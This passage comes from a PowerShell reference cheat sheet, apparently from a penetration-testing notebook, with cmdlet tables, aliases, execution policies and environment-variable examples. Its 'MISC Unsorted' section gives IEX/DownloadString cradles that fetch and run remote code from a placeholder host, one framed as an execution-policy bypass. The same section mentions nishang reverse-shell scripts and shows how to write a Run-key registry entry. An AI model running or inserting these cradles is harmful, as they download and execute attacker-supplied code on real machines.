| [Write-Output](https://www.pdq.com/powershell/write-output/) | echo, write | Sends the specified objects to the next command in the pipeline. If the command is the last command in the pipeline, the objects are written to the console. | Cmdlet |

### Functions

Run PowerShell scripts or C\# code directly from the terminal!



TODO: Break this table in sections by Category; 

Run `Get-Help $function_name -Examples` for usage



| Function Name | Alias | Description | Category |
| :--- | :--- | :--- | :--- |
| [Add-MpPreference](https://www.pdq.com/powershell/add-mppreference/) |  | Modifies settings for Windows Defender. | Security |
| [Add-VpnConnection](https://www.pdq.com/powershell/add-vpnconnection/) |  | Adds a VPN connection to the Connection Manager phone book. | Network |
| [Add-VpnConnectionRoute](https://www.pdq.com/powershell/add-vpnconnectionroute/) |  | Adds a route to a VPN connection. | Network |
| [Add-Printer](https://www.pdq.com/powershell/add-printer/) |  | Adds a printer to the specified computer. | Printer |
| [Add-PrinterDriver](https://www.pdq.com/powershell/add-printerdriver/) |  | Installs a printer driver on the specified computer. | Printer |
| [Add-PrinterPort](https://www.pdq.com/powershell/add-printerport/) |  | Installs a printer port on the specified computer. | Printer |
| [Clear-Disk](https://www.pdq.com/powershell/clear-disk/) |  | Cleans a disk by removing all partition information and un-initializing it, erasing all data on the disk. | Storage |
| [Clear-Host](https://www.pdq.com/powershell/clear-host/) | clear, cls | Clears the display in the host program.  Alias: **`clear`** or **`cls`** | Utility |
| [Compress-Archive](https://www.pdq.com/powershell/compress-archive/) |  | Creates an archive, or zipped file, from specified files and folders. | Utility |
| [Disable-NetAdapterBinding](https://www.pdq.com/powershell/disable-netadapterbinding/) |  | Disables a binding to a network adapter. | Network |
| [Enable-BitLocker](https://www.pdq.com/powershell/enable-bitlocker/) |  | Enables encryption for a BitLocker volume. | Security |
| [Enable-NetFirewallRule](https://www.pdq.com/powershell/enable-netfirewallrule/) |  | Enables a previously disabled firewall rule. | Security |
| [Expand-Archive](https://www.pdq.com/powershell/expand-archive/) |  | Extracts files from a specified archive \(zipped\) file. | Utility |
| [Find-Module](https://www.pdq.com/powershell/find-module/) |  | Finds modules from an online gallery that match specified criteria. | PoSh |
| [Format-Volume](https://www.pdq.com/powershell/format-volume/) |  | Formats one or more existing volumes or a new volume on an existing partition. | Storage |
| [Get-BitLockerVolume](https://www.pdq.com/powershell/get-bitlockervolume/) |  | Gets information about volumes that BitLocker can protect. | Security |
| [Get-Disk](https://www.pdq.com/powershell/get-disk/) |  | Gets one or more disks visible to the operating system. | Storage |
| [Get-DnsClientServerAddress](https://www.pdq.com/powershell/get-dnsclientserveraddress/) |  | Gets DNS server IP addresses from the TCP/IP properties on an interface. | Network |
| [Get-FileHash](https://www.pdq.com/powershell/get-filehash/) |  | Computes the hash value for a file by using a specified hash algorithm. | Utility |
| [Get-InitiatorPort](https://www.pdq.com/powershell/get-initiatorport/) |  | Gets one or more host bus adapter \(HBA\) initiator ports. | Network |
| [Get-InstalledModule](https://www.pdq.com/powershell/get-installedmodule/) |  | Gets installed modules on a computer. | PoSh |
| [Get-NetAdapter](https://www.pdq.com/powershell/get-netadapter/) |  | Gets the basic network adapter properties. | Network |
| [Get-NetAdapterVmq](https://www.pdq.com/powershell/get-netadaptervmq/) |  | Gets the VMQ properties of a network adapter. | Network |
| [Get-NetConnectionProfile](https://www.pdq.com/powershell/get-netconnectionprofile/) |  | Gets a connection profile. | Network |
| [Get-NetFirewallRule](https://www.pdq.com/powershell/get-netfirewallrule/) |  | Retrieves firewall rules from the target computer. | Security |
| [Get-NetIPConfiguration](https://www.pdq.com/powershell/get-netipconfiguration/) |  | Gets IP network configuration. | Network |
| [Get-NetIPAddress](https://www.pdq.com/powershell/get-netipaddress/) |  | Gets the IP address configuration. | Network |
| [Get-NetIPInterface](https://www.pdq.com/powershell/get-netipinterface/) |  | Gets an IP interface. | Network |
| [Get-NetTCPConnection](https://www.pdq.com/powershell/get-nettcpconnection/) |  | Gets TCP connections. | Network |
| [Get-Partition](https://www.pdq.com/powershell/get-partition/) |  | Returns a list of all partition objects visible on all disks, or optionally a filtered list using specifiedparameters. | Storage |
| [Get-PhysicalDisk](https://www.pdq.com/powershell/get-physicaldisk/) |  | Gets a list of all PhysicalDisk objects visible across any available Storage Management Providers, or optionally afiltered list. | Storage |
| [Get-PnpDevice](https://www.pdq.com/powershell/get-pnpdevice/) |  | Returns information about PnP devices. | Hardware |
| [Get-Printer](https://www.pdq.com/powershell/get-printer/) |  | Retrieves a list of printers installed on a computer. | Printer |
| [Get-PSRepository](https://www.pdq.com/powershell/get-psrepository/) |  | Gets PowerShell repositories. | PoSh |
| [Get-ScheduledTask](https://www.pdq.com/powershell/get-scheduledtask/) |  | Gets the task definition object of a scheduled task that is registered on the local computer. | SchTask |
| [Get-ScheduledTaskInfo](https://www.pdq.com/powershell/get-scheduledtaskinfo/) |  | Gets run-time information for a scheduled task. | SchTask |
| [Get-SmbConnection](https://www.pdq.com/powershell/get-smbconnection/) |  | Retrieves the connections established from the SMB client to the SMB servers. | SMB |
| [Get-SmbOpenFile](https://www.pdq.com/powershell/get-smbopenfile/) |  | Retrieves basic information about the files that are open on behalf of the clients of the SMB server. | SMB |
| [Get-SmbServerConfiguration](https://www.pdq.com/powershell/get-smbserverconfiguration/) |  | Retrieves the SMB server configuration. | SMB |
| [Get-SmbSession](https://www.pdq.com/powershell/get-smbsession/) |  | Retrieves information about the SMB sessions that are currently established between the SMB server and the associated clients. | SMB |
| [Get-SmbShare](https://www.pdq.com/powershell/get-smbshare/) |  | Retrieves the SMB shares on the computer. | SMB |
| [Get-SmbShareAccess](https://www.pdq.com/powershell/get-smbshareaccess/) |  | Retrieves the ACL of the SMB share. | SMB |
| [Get-StartApps](https://www.pdq.com/powershell/get-startapps/) |  | Gets the names and AppIDs of installed apps. | Apps |
| [Get-StorageJob](https://www.pdq.com/powershell/get-storagejob/) |  | Returns information about long-running Storage module jobs, such as a repair task. | Storage |
| [Get-TlsCipherSuite](https://www.pdq.com/powershell/get-tlsciphersuite/) |  | Gets the list of cipher suites for TLS for a computer. | Network |
| [Get-VirtualDisk](https://www.pdq.com/powershell/get-virtualdisk/) |  | Returns a list of VirtualDisk objects. This can be across all storage pools, across all providers, or optionally as a filtered subset. | Storage |
| [Get-Volume](https://www.pdq.com/powershell/get-volume/) |  | Gets the specified Volume object, or all Volume objects if no filter is provided. | Storage |
| [Get-VpnConnection](https://www.pdq.com/powershell/get-vpnconnection/) |  | Retrieves the specified VPN connection profile information. | Network |
| [Get-WindowsUpdateLog](https://www.pdq.com/powershell/get-windowsupdatelog/) |  | Merges Windows Update .etl files into a single log file. | Security |
| [Grant-SmbShareAccess](https://www.pdq.com/powershell/grant-smbshareaccess/) |  | Adds an allow ACE for a trustee to the security descriptor of the SMB share. | SMB |
| [Install-Module](https://www.pdq.com/powershell/install-module/) |  | Downloads one or more modules from an online gallery, and installs them on the local computer. | PoSh |
| [Invoke-Pester](https://www.pdq.com/powershell/invoke-pester/) |  | Invokes Pester to run all tests \(files containing \*.Tests.ps1\) recursively under the Path | PoSh |
| [Initialize-Disk](https://www.pdq.com/powershell/initialize-disk/) |  | Initializes a RAW disk for first time use, enabling the disk to be formatted and used to store data. | Storage |
| [Mount-DiskImage](https://www.pdq.com/powershell/mount-diskimage/) |  | Mounts a previously created disk image \(virtual hard disk or ISO\), making it appear as a normal disk. | Storage |
| [New-Guid](https://www.pdq.com/powershell/new-guid/) |  | Creates a GUID. | Utility |
| [New-NetFirewallRule](https://www.pdq.com/powershell/new-netfirewallrule/) |  | Creates a new inbound or outbound firewall rule and adds the rule to the target computer. | Security |
| [New-NetIPAddress](https://www.pdq.com/powershell/new-netipaddress/) |  | Creates and configures an IP address. | Network |
| [New-NetLbfoTeam](https://www.pdq.com/powershell/new-netlbfoteam/) |  | Creates a new NIC team. | Network |
| [New-NetNat](https://www.pdq.com/powershell/new-netnat/) |  | Creates a NAT object. | Network |
| [New-NetRoute](https://www.pdq.com/powershell/new-netroute/) |  | Creates a route in the IP routing table. | Network |
| [New-Partition](https://www.pdq.com/powershell/new-partition/) |  | Creates a new partition on an existing Disk object. | Storage |
| [New-ScheduledTask](https://www.pdq.com/powershell/new-scheduledtask/) |  | Creates a scheduled task instance. | SchTask |
| [New-ScheduledTaskAction](https://www.pdq.com/powershell/new-scheduledtaskaction/) |  | Creates a scheduled task action. | SchTask |
| [New-ScheduledTaskPrincipal](https://www.pdq.com/powershell/new-scheduledtaskprincipal/) |  | Creates an object that contains a scheduled task principal. | SchTask |
| [New-ScheduledTaskSettingsSet](https://www.pdq.com/powershell/new-scheduledtasksettingsset/) |  | Creates a new scheduled task settings object. | SchTask |
| [New-ScheduledTaskTrigger](https://www.pdq.com/powershell/new-scheduledtasktrigger/) |  | Creates a scheduled task trigger object. | SchTask |
| [New-SmbMapping](https://www.pdq.com/powershell/new-smbmapping/) |  | Creates an SMB mapping. | SMB |
| [New-SmbShare](https://www.pdq.com/powershell/new-smbshare/) |  | Creates an SMB share. | SMB |
| [New-StoragePool](https://www.pdq.com/powershell/new-storagepool/) |  | Creates a new storage pool using a group of physical disks. | Storage |
| [New-VirtualDisk](https://www.pdq.com/powershell/new-virtualdisk/) |  | Creates a new virtual disk in the specified storage pool. | Storage |
| [New-Volume](https://www.pdq.com/powershell/new-volume/) |  | Creates a volume with the specified file system. | Storage |
| [Optimize-Volume](https://www.pdq.com/powershell/optimize-volume/) |  | Optimizes a storage volume. | Storage |
| [Register-PSRepository](https://www.pdq.com/powershell/register-psrepository/) |  | Registers a PowerShell repository. | PoSh |
| [Register-ScheduledTask](https://www.pdq.com/powershell/register-scheduledtask/) |  | Registers a scheduled task definition on a local computer. | SchTask |
| [Remove-NetIPAddress](https://www.pdq.com/powershell/remove-netipaddress/) |  | Removes an IP address and its configuration. | Network |
| [Remove-PhysicalDisk](https://www.pdq.com/powershell/remove-physicaldisk/) |  | Removes a physical disk from a specified storage pool. | Storage |
| [Remove-Printer](https://www.pdq.com/powershell/remove-printer/) |  | Removes a printer from the specified computer. | Printer |
| [Repair-Volume](https://www.pdq.com/powershell/repair-volume/) |  | Performs repairs on a volume. | Storage |
| [Resize-Partition](https://www.pdq.com/powershell/resize-partition/) |  | Resizes a partition and the underlying file system. | Storage |
| [Save-Module](https://www.pdq.com/powershell/save-module/) |  | Saves a module locally without installing it. | PoSh |
| [Set-Clipboard](https://www.pdq.com/powershell/set-clipboard/) |  | Sets the current Windows clipboard entry. | Utility |
| [Set-Disk](https://www.pdq.com/powershell/set-disk/) |  | Takes a Disk object or unique disk identifiers and a set of attributes, and updates the physical disk on thesystem. | Storage |
| [Set-DnsClientServerAddress](https://www.pdq.com/powershell/set-dnsclientserveraddress/) |  | Sets DNS server addresses associated with the TCP/IP properties on an interface. | Network |
| [Set-MpPreference](https://www.pdq.com/powershell/set-mppreference/) |  | Configures preferences for Windows Defender scans and updates. | Security |
| [Set-NetAdapter](https://www.pdq.com/powershell/set-netadapter/) |  | Sets the basic network adapter properties. | Network |
| [Set-NetAdapterVmq](https://www.pdq.com/powershell/set-netadaptervmq/) |  | Sets the VMQ properties of a network adapter. | Network |
| [Set-NetConnectionProfile](https://www.pdq.com/powershell/set-netconnectionprofile/) |  | Changes the network category of a connection profile. | Network |
| [Set-NetFirewallProfile](https://www.pdq.com/powershell/set-netfirewallprofile/) |  | Configures settings that apply to the per-profile configurations of the Windows Firewall with Advanced Security. | Security |
| [Set-NetFirewallRule](https://www.pdq.com/powershell/set-netfirewallrule/) |  | Modifies existing firewall rules. | Security |
| [Set-NetIPAddress](https://www.pdq.com/powershell/set-netipaddress/) |  | Modifies the configuration of an IP address. | Network |
| [Set-NetIPInterface](https://www.pdq.com/powershell/set-netipinterface/) |  | Modifies an IP interface. | Network |
| [Set-Partition](https://www.pdq.com/powershell/set-partition/) |  | Sets attributes of a partition, such as active, read-only, and offline states. | Storage |
| [Set-PhysicalDisk](https://www.pdq.com/powershell/set-physicaldisk/) |  | Sets attributes on a specific physical disk. | Storage |
| [Set-Printer](https://www.pdq.com/powershell/set-printer/) |  | Updates the configuration of an existing printer. | Printer |
| [Set-PSRepository](https://www.pdq.com/powershell/set-psrepository/) |  | Sets values for a registered repository. | PoSh |
| [Set-ScheduledTask](https://www.pdq.com/powershell/set-scheduledtask/) |  | Modifies a scheduled task. | SchTask |
| [Set-SmbClientConfiguration](https://www.pdq.com/powershell/set-smbclientconfiguration/) |  | Sets the SMB client configuration. | SMB |
| [Set-SmbShare](https://www.pdq.com/powershell/set-smbshare/) |  | Modifies the properties of the SMB share. | SMB |
| [Set-SmbServerConfiguration](https://www.pdq.com/powershell/set-smbserverconfiguration/) |  | Sets the SMB Service configuration. | SMB |
| [Set-VpnConnection](https://www.pdq.com/powershell/set-vpnconnection/) |  | Changes the configuration settings of an existing VPN connection profile. | Network |
| [Start-ScheduledTask](https://www.pdq.com/powershell/start-scheduledtask/) |  | Starts one or more instances of a scheduled task. | SchTask |
| [Suspend-BitLocker](https://www.pdq.com/powershell/suspend-bitlocker/) |  | Suspends Bitlocker encryption for the specified volume. | Security |
| [Test-NetConnection](https://www.pdq.com/powershell/test-netconnection/) |  | Displays diagnostic information for a connection. | Network |
| [Uninstall-Module](https://www.pdq.com/powershell/uninstall-module/) |  | Uninstalls a module. | PoSh |
| [Unregister-ScheduledTask](https://www.pdq.com/powershell/unregister-scheduledtask/) |  | Unregisters a scheduled task. | SchTask |
| [Update-Module](https://www.pdq.com/powershell/update-module/) |  | Downloads and installs the newest version of specified modules from an online gallery to the local computer. | PoSh |
| [Update-Script](https://www.pdq.com/powershell/update-script/) |  | Updates a script. | PoSh |

### Aliases

There are many built-in aliases for the most commonly used cmdlets.  The developers wanted to make cmd.exe and Unix users feel at home, so many of those basic commands will function in a similar way.

<table>
  <thead>
    <tr>
      <th style="text-align:left">Cmdlet</th>
      <th style="text-align:left">Aliases</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Get-ChildItem</td>
      <td style="text-align:left">
        <ul>
          <li>ls</li>
          <li>dir</li>
          <li>gci</li>
        </ul>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Get-Content</td>
      <td style="text-align:left">
        <ul>
          <li>cat</li>
          <li>type</li>
          <li>gc</li>
        </ul>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Set-Location</td>
      <td style="text-align:left">
        <ul>
          <li>cd</li>
          <li>chdir</li>
          <li></li>
        </ul>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
  </tbody>
</table>

## Check the Version of PowerShell

```text
$PSVersionTable
```

## Script Execution Policy

| Policy | Description |
| :--- | :--- |
| **AllSigned** | All .ps1 files must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. |
| **Bypass** | Bypasses checks for whether files are signed, and internet origin is not verified. |
| **Default** | The default policies are **Restricted** \(client systems\) or **RemoteSigned** \(Server 2016+\) |
| **RemoteSigned** | All .ps1 files originating from the internet must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. Allows local scripts and remote scripts if they are signed. |
| **Restricted** | All .ps1 files are blocked.  |
| **Undefined** | There is no execution policy set in the current scope. Reverts to **Default** policy. |

To view current execution policy check use the cmdlet `Get-ExecutionPolicy`.  If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems \(Windows 10\) or **RemoteSigned** \(Server 2016+\). ****The policy can be changed with the cmdlet `Set-ExecutionPolicy <PolicyName>`. 

{% hint style="success" %}
For**`Execution-Policy`** bypass methods for privilege escalation and so on see [this section](windows/privilege-escalation.md#script-execution-policy-bypass-methods).
{% endhint %}

## Environment Variables

{% tabs %}
{% tab title="PowerShell" %}
Show all current environment variables in PowerShell: `Get-ChildItem Env:`
{% endtab %}

{% tab title="cmd.exe" %}
Show all current environment variables in cmd.exe: `set`
{% endtab %}
{% endtabs %}

You can assign values to Environment Variables without using a cmdlet using the following syntax:

```text
$Env:<variable> = "<value>"
```

You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, to use the `Set-Item` cmdlet to append `;C:\Windows\Temp` to the value of the `$Env:PATH` environment variable, use the following syntax:

```text
Set-Item -Path Env:PATH -Value ($Env:Path + ";C:\Windows\Temp")
```

{% hint style="info" %}
In this command, the value **`$Env:Path + ";C:\Windows\Temp"`** is enclosed in parentheses so that it is interpreted as a single unit.
{% endhint %}

### Adding a Folder to PATH

{% tabs %}
{% tab title="Windows" %}
To append `C:\Windows\Temp` to the PATH , use the following syntax \(note the \(`;`\) separator\):

```text
$Env:PATH += ";C:\Windows\Temp"
```
{% endtab %}

{% tab title="Linux/MacOS" %}
On Linux or MacOS, the colon \(`:`\) in the command separates each path in the list.

```text
$Env:PATH += ":/temp"
```
{% endtab %}
{% endtabs %}

#### Using System.Environment methods <a id="using-systemenvironment-methods"></a>

The **System.Environment** class provides **GetEnvironmentVariable** and **SetEnvironmentVariable** methods that allow you to specify the scope of the variable.

The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.PowerShellCopy

```text
$path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
$newpath = $path + ';C:\Program Files\Fabrikam\Modules'
[Environment]::SetEnvironmentVariable("PSModulePath", $newpath, 'Machine')
```

## Working with Files

### Change file attributes

This can also be used to change file property flags such as Hidden, Archive, and ReadOnly.

```text
$file = (Get-ChildItem <file>) #can shorten command with gci or ls
$file.attributes #Show the files attributes
Normal

#Flip the bit of the Hidden attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Hidden

#To remove the 'Hidden' attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Normal
```

## MISC Unsorted

{% tabs %}
{% tab title="Windows" %}
PowerShell.exe full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`
{% endtab %}

{% tab title="Linux/MacOS" %}
PowerShell.exe full path: `/usr/local/microsoft/powershell/7/`
{% endtab %}
{% endtabs %}

Get tons of computer info in PowerShell: `Get-ComputerInfo`

Fully PowerShell version of `wget`. Retrieve file and execute remote code after downloading:

```text
powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
```

Can also use `wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html` to save the file to the local machine.  `wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile` is needed to save the file to disk.

PowerShell Script Execution Bypass: \[can embed in php too! TODO: write script example of this\]:

```text
Echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | PowerShell -NoProfile -
```

PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)

### Modifying the Registry

add a new key to registry  `New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name>` then set its properties with  `New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<key_value>"`To edit a value that is already set use `Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name> -Value "<new_value>"`

### List environment variables

`dir env:`

## Resources

* [http://vcloud-lab.com/Microsoft](http://vcloud-lab.com/Microsoft)
* [http://go.microsoft.com/fwlink/?LinkID=135170](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7)
* [https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7)

